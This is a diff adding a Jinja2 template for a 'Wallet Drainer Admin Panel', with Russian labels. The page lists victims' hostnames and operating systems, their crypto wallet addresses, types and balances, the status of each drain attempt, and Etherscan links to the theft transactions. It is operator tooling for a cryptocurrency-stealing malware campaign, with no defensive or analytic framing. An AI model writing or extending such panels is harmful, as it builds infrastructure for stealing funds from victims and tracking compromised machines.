@@ -1,0 +1,52 @@
+{% extends "shared/base_layout.html" %}
+{% block title %}Wallet Drainer Admin{% endblock %}
+{% block content %}
+<div class="card">
+    <h2>Wallet Drainer Admin Panel</h2>
+    <form method="get" class="filter-bar">
+        <input type="text" name="hostname" placeholder="Поиск по hostname..." value="{{ request.query_params.get('hostname', '') }}">
+        <input type="text" name="address" placeholder="Поиск по адресу..." value="{{ request.query_params.get('address', '') }}">
+        <select name="status">
+            <option value="">Все статусы</option>
+            <option value="success">Успешно</option>
+            <option value="error">Ошибка</option>
+            <option value="empty">Пусто</option>
+        </select>
+        <button type="submit" class="btn">Фильтр</button>
+    </form>
+    <table class="table">
+        <thead>
+            <tr>
+                <th>Время</th>
+                <th>Hostname</th>
+                <th>OS</th>
+                <th>Кошелек</th>
+                <th>Тип</th>
+                <th>Баланс</th>
+                <th>Статус вывода</th>
+                <th>TxHash</th>
+                <th>Действия</th>
+            </tr>
+        </thead>
+        <tbody>
+            {% for report in reports %}
+                {% for wallet in report.wallets %}
+                <tr>
+                    <td>{{ report.timestamp }}</td>
+                    <td>{{ report.victim.hostname }}</td>
+                    <td>{{ report.victim.os }}</td>
+                    <td>{{ wallet.address }}</td>
+                    <td>{{ wallet.type }}</td>
+                    <td>{{ wallet.balance }}</td>
+                    <td>{{ wallet.drain_result.status }}</td>
+                    <td>{% if wallet.drain_result.tx_hash %}<a href="https://etherscan.io/tx/{{ wallet.drain_result.tx_hash }}" target="_blank">{{ wallet.drain_result.tx_hash[:10] }}...</a>{% endif %}</td>
+                    <td>
+                        <a href="/wallet_drainer_admin/view_report?path={{ report.report_file }}" class="btn">Детали</a>
+                    </td>
+                </tr>
+                {% endfor %}
+            {% endfor %}
+        </tbody>
+    </table>
+</div>
+{% endblock %} 
